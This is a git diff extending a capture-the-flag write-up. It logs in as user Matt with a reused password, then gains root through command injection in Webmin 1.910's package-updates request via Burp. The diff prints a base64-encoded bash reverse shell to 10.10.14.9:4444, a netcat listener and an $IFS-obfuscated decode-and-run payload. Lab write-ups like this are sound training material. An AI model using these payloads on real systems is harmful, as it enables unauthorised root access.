@@ -112,9 +112,70 @@ reading sshd_config shows Matt is a denied login
 Postmatt
 <pre> su Matt </pre>
 <pre> Password: computer2008 </pre>
+
 ![postmatt](https://user-images.githubusercontent.com/66635295/178075034-35d1fd9d-d29c-4def-846f-df32e4c3d510.png)
 
 Flag is now accessible 
 
 ![user flag](https://user-images.githubusercontent.com/66635295/178075070-f098c396-939f-4315-8073-d0e6d0a53312.png)
+
+Webin is also accessible via same password
+
+![mattlogin](https://user-images.githubusercontent.com/66635295/178095015-e4c8460d-8f94-4793-a0d4-d45035112b3f.png)
+
+Checking Version shows webin 1.910
+
+![version](https://user-images.githubusercontent.com/66635295/178095064-db2a39be-d321-41b3-9c3c-48097a84a05d.png)
+
+**Root shell**
+---
+**Vulnearbilty**
+
+CVE 2019-12850 is a severe vulnerability 
+
+![vuln](https://user-images.githubusercontent.com/66635295/178095122-fe3ad733-aa3d-4bda-8e4d-b46ab7dd55a0.png)
+
+Maneuver to Package Updates and turn on Burpsuite interceptor 
+
+![burpon](https://user-images.githubusercontent.com/66635295/178095397-ea80e6f1-a9b4-4ae5-ab8d-8229afeb5fc5.png)
+
+Send package-updates request to the repeater. Clear out some of the extra HTTP and add u=acl%2Fapt&u=$ to execute commands.
+
+![check](https://user-images.githubusercontent.com/66635295/178095579-cd0cffb2-676e-4c12-be58-da3e29e627f1.png)
+
+**Payload** 
+
+Base64
+<pre>echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1"'| base64 </pre>
+-newline -command_string -interactive_shell standard output TCP connection HOST/LISTENING PORT standard input
+
+![base64](https://user-images.githubusercontent.com/66635295/178096539-257455ab-9507-4c0e-beb6-d6016db08edc.png)
+
+Netcat
+<pre> nc -lvp 4444 </pre>
+-listen -verbose -port
+
+![netcat](https://user-images.githubusercontent.com/66635295/178096671-66df4f9c-4244-4504-bda1-2382c01f559d.png)
+
+URL Encode
+<pre>$(echo${IFS}TCPSTRING|base64${IFS}-d|bash)</pre>
+{IFS} prevent command from splitting  -decode
+
+![url](https://user-images.githubusercontent.com/66635295/178096699-4811c722-342f-48be-a4c9-e05f10c36c88.png)
+
+
+Put payload in the repeater
+
+![payload](https://user-images.githubusercontent.com/66635295/178097240-7bad79e8-c25f-4922-bf62-333b3ce8f9d6.png)
+
+**Shell**
+
+Root Connection on listner
+
+![shell](https://user-images.githubusercontent.com/66635295/178097333-c92dc960-1b42-4656-b3c9-1950676d08f4.png)
+
+Flag in home directory
+
+![rootflag](https://user-images.githubusercontent.com/66635295/178097415-cb60be01-dfa4-4b18-91c7-1510c068e727.png)
+
 
